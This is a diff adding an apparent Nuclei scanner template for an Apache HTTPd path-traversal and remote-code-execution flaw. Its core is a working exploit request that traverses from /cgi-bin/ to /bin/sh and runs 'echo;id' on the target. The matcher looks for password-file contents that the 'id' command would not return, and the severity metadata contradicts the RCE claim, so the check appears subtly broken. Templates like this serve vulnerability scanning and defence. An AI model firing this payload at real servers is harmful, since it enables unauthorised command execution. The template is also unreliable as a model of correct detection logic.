@@ -1,0 +1,33 @@
+id: Apache-HTTPd-LFD-RCE
+
+info:
+  name: Apache HTTPd LFD RCE
+  author: momika233
+  severity: high
+  description: Apache HTTPd LFD RCE
+  reference:
+    - https://www.github.com/momika233
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-22
+  tags: Apache,HTTPd,Local-file-disclosure,RCE
+
+requests:
+  - raw:
+      - |
+        POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
+        Host: {{Hostname}}
+        
+
+        echo;id
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
